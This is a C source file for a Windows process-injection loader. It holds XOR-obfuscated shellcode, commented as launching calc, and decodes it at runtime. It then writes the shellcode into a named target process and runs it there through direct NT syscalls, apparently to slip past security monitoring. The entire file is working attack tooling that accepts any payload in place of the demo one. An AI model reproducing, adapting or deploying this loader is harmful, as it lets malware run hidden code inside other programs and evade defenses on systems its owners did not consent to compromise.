#include "DirectInject.h"
#include "syscalls.h"
#include <stdio.h>
#include <TlHelp32.h>
#include <lmcons.h>

// calc
unsigned char joker[] = "\xce\x7a\xb1\xd6\xc2\xda\xfe\x32\x32\x32\x73\x63\x73\x62\x60\x7a\x03\xe0\x57\x7a\xb9\x60\x52\x63\x7a\xb9\x60\x2a\x64\x7a\xb9\x60\x12\x7a\xb9\x40\x62\x7a\x3d\x85\x78\x78\x7f\x03\xfb\x7a\x03\xf2\x9e\x0e\x53\x4e\x30\x1e\x12\x73\xf3\xfb\x3f\x73\x33\xf3\xd0\xdf\x60\x73\x63\x7a\xb9\x60\x12\xb9\x70\x0e\x7a\x33\xe2\x54\xb3\x4a\x2a\x39\x30\x3d\xb7\x40\x32\x32\x32\xb9\xb2\xba\x32\x32\x32\x7a\xb7\xf2\x46\x55\x7a\x33\xe2\x62\x76\xb9\x72\x12\xb9\x7a\x2a\x7b\x33\xe2\xd1\x64\x7f\x03\xfb\x7a\xcd\xfb\x73\xb9\x06\xba\x7a\x33\xe4\x7a\x03\xf2\x73\xf3\xfb\x3f\x9e\x73\x33\xf3\x0a\xd2\x47\xc3\x7e\x31\x7e\x16\x3a\x77\x0b\xe3\x47\xea\x6a\x76\xb9\x72\x16\x7b\x33\xe2\x54\x73\xb9\x3e\x7a\x76\xb9\x72\x2e\x7b\x33\xe2\x73\xb9\x36\xba\x7a\x33\xe2\x73\x6a\x73\x6a\x6c\x6b\x68\x73\x6a\x73\x6b\x73\x68\x7a\xb1\xde\x12\x73\x60\xcd\xd2\x6a\x73\x6b\x68\x7a\xb9\x20\xdb\x79\xcd\xcd\xcd\x6f\x7b\x8c\x45\x41\x00\x6d\x01\x00\x32\x32\x73\x64\x7b\xbb\xd4\x7a\xb3\xde\x92\x33\x32\x32\x7b\xbb\xd7\x7b\x8e\x30\x32\x33\x89\x38\x32\x30\xb2\x73\x66\x7b\xbb\xd6\x7e\xbb\xc3\x73\x88\x7e\x45\x14\x35\xcd\xe7\x7e\xbb\xd8\x5a\x33\x33\x32\x32\x6b\x73\x88\x1b\xb2\x59\x32\xcd\xe7\x58\x38\x73\x6c\x62\x62\x7f\x03\xfb\x7f\x03\xf2\x7a\xcd\xf2\x7a\xbb\xf0\x7a\xcd\xf2\x7a\xbb\xf3\x73\x88\xd8\x3d\xed\xd2\xcd\xe7\x7a\xbb\xf5\x58\x22\x73\x6a\x7e\xbb\xd0\x7a\xbb\xcb\x73\x88\xab\x97\x46\x53\xcd\xe7\xb7\xf2\x46\x38\x7b\xcd\xfc\x47\xd7\xda\xa1\x32\x32\x32\x7a\xb1\xde\x22\x7a\xbb\xd0\x7f\x03\xfb\x58\x36\x73\x6a\x7a\xbb\xcb\x73\x88\x30\xeb\xfa\x6d\xcd\xe7\xb1\xca\x32\x4c\x67\x7a\xb1\xf6\x12\x6c\xbb\xc4\x58\x72\x73\x6b\x5a\x32\x22\x32\x32\x73\x6a\x7a\xbb\xc0\x7a\x03\xfb\x73\x88\x6a\x96\x61\xd7\xcd\xe7\x7a\xbb\xf1\x7b\xbb\xf5\x7f\x03\xfb\x7b\xbb\xc2\x7a\xbb\xe8\x7a\xbb\xcb\x73\x88\x30\xeb\xfa\x6d\xcd\xe7\xb1\xca\x32\x4f\x1a\x6a\x73\x65\x6b\x5a\x32\x72\x32\x32\x73\x6a\x58\x32\x68\x73\x88\x39\x1d\x3d\x02\xcd\xe7\x65\x6b\x73\x88\x47\x5c\x7f\x53\xcd\xe7\x7b\xcd\xfc\xdb\x0e\xcd\xcd\xcd\x7a\x33\xf1\x7a\x1b\xf4\x7a\xb7\xc4\x47\x86\x73\xcd\xd5\x6a\x58\x32\x6b\x89\xd2\x2f\x18\x38\x73\xbb\xe8\xcd\xe7\x32";
SIZE_T joker_len = sizeof(joker);
char key = '2';

// Debug Symbols
char ok[6] = "\n(+)";
char in[6] = "\n\t(*)";
char err[6] = "\n(-)";
char ar[12] = "---------->";

int FindTarget(LPCWSTR procname) {
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcSnap == INVALID_HANDLE_VALUE) {
        printf("%s Failed to take snapshot, error: %ld", err, GetLastError());

        return EXIT_FAILURE;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcSnap, &pe32)) {

        printf("%s Failed to parse snapshot, error: %ld", err, GetLastError());
        CloseHandle(hProcSnap);
        return EXIT_FAILURE;
    }

    while (Process32Next(hProcSnap, &pe32)) {
        if (lstrcmpW(pe32.szExeFile, procname) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    }
    CloseHandle(hProcSnap);
    return pid;
}

int Decrypt() {
    int i = 0;
    for (i; i < sizeof(joker) - 1; i++)
    {
        joker[i] = joker[i] ^ key;
    }

    return EXIT_SUCCESS;
}

int wmain(int argc, wchar_t* argv[]) {
	
	if (argc != 2 || !argv[1] || argv[1] == NULL) {
		printf("%s Usage: %ls <process name>", err, argv[0]);
		return EXIT_FAILURE;
	}

    NTSTATUS status;
    HANDLE hProc, hThread;
    LPVOID rBaseAddress = NULL;
    CLIENT_ID ClientId;
    OBJECT_ATTRIBUTES ObjectAttributes;
    ULONG OldProtect = NULL;

    LPCWSTR procname = argv[1];
    //LPCWSTR procname = L"notepad.exe";

    DWORD pid = FindTarget(procname);
    if (pid == 0 || pid == EXIT_FAILURE) {
        printf("%s Failed to find pid for %ls, are you sure its running?", err, procname);
        return EXIT_FAILURE;
    }

    printf("%s Retrieved pid for %ls: %d", ok, procname, pid);

    printf("%s Decoding %zu bytes...", ok, sizeof(joker));
    Decrypt();
    printf("%s Decoded %zu bytes...", in, sizeof(joker));

    // no reason to create these objects if FindTarget fails
    ClientId = { (HANDLE)pid, NULL };
    ObjectAttributes = { sizeof(ObjectAttributes) };

    // Successful execution will return an NTSTATUS of 0. 
    status = NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &ObjectAttributes, &ClientId);
    if (status != 0) {
        printf("%s Failed to open handle to %ls [%d], error: %ld", ok, procname, pid, GetLastError());
        return EXIT_FAILURE;
    }
    printf("%s NtOpenProcess() %s Got handle to %ls [%d]", ok, ar, procname, pid);
    
    status = NtAllocateVirtualMemory(hProc, &rBaseAddress, 0, &joker_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        printf("%s NtAllocateVirtualMemory() %s Failed to allocate memory within %ls [%d] %s Error: %x", err, ar, procname, pid, ar, status);
        return EXIT_FAILURE;
    }
    printf("%s NtAllocateVirtualMemory() %s Allocated %zu bytes in %ls %s 0x%p", ok, ar, joker_len, procname, ar, rBaseAddress);

    status = NtWriteVirtualMemory(hProc, rBaseAddress, joker, sizeof(joker), NULL);
    if (status != 0) {
        printf("%s NtWriteVirtualMemory() %s Failed to copy to %ls memory at 0x%p %s Error: %x", err, ar, procname, rBaseAddress, ar, status);
    }
    printf("%s NtWriteVirtualMemory() %s Wrote %zu bytes in %ls", ok, ar, sizeof(joker), procname);

    status = NtProtectVirtualMemory(hProc, &rBaseAddress, &joker_len, PAGE_EXECUTE_READ, &OldProtect);
    if (status != 0) {
        printf("%s NtProtectVirtualMemory() Failed to change memory protection at 0x%p from PAGE_READWRITE to PAGE_EXECUTEREAD, error: %x", err, rBaseAddress, status);
        return EXIT_FAILURE;
    }
    printf("%s NtProtectVirtualMemory() %s Changed memory protection at 0x%p from PAGE_READWRITE to PAGE_EXECUTE_READ", ok, ar, rBaseAddress);

    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &ObjectAttributes, hProc, rBaseAddress, NULL, 0, 0, 0, 0, NULL);
    if (status != 0) {
        printf("%s Failed to create thread, error: %x", err, status);
        return EXIT_FAILURE;
    }
    printf("%s NtCreateThreadEx() %s Created thread at 0x%p", ok, ar, rBaseAddress);

    printf("%s WaitForSingleObject() %s Waiting for execution to complete...", in, ar);
    WaitForSingleObject(hThread, INFINITE);
    printf("%s WaitForSingleObject() %s Thread execution complete", in, ar);

    printf("%s Cleaning up...", ok);
    NtClose(hThread);
    printf("%s NtClose() %s Closed handle to thread", ok, ar);
    NtClose(hProc);
    printf("%s NtClose() %s Closed handle to %ls", ok, ar, procname);

    printf("%s Done", ok);

    return EXIT_SUCCESS;
}